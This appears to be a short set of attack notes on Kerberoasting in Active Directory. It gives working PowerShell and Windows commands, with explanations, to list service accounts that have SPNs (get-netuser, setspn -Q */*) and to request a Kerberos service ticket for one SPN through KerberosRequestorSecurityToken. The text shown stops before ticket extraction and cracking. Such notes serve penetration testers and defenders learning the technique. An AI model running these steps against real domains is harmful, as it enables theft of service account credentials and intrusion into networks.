Kerberoasting
-------------
1. Identify user accounts with SPN enabled
   C:>  get-netuser | where-object {$_.servicePrincipalName} | fl

   The setspn command in Windows is used to manage Service Principal Names (SPNs) for an Active Directory (AD) service account. 
   SPNs are unique identifiers for services running on servers. They are used by Kerberos authentication to associate a service instance with a service logon account.

   C:> setspn -T research -Q */*

   research is a domain name
   -Q */*: This option queries for SPNs. The asterisks */* act as wildcards, meaning the query will look for all SPNs in the specified domain or forest.

   C:> klist

2. Request a TGS ticket for the specified SPN using Kerberos.

   C:>Add-Type -AssemblyName system.identityModel 

   The Add-Type cmdlet in PowerShell is used to add .NET Framework types to a PowerShell session. This allows you to use .NET classes and methods directly within PowerShell scripts.

   Add-Type: The cmdlet used to add .NET types.
   AssemblyName: Specifies the name of the assembly containing the types you want to add.
   System.IdentityModel: The name of the assembly to add. This particular assembly is part of the .NET Framework and provides classes for identity management, security tokens, and claims-based authentication.
   
   C:> New-object System.identityModel.Tokens.KerberosRequestorSecurityToken -Argumentlist "ops/research.SECURITY.local:1434"

   "ops/research.SECURITY.local:1434" = SPN

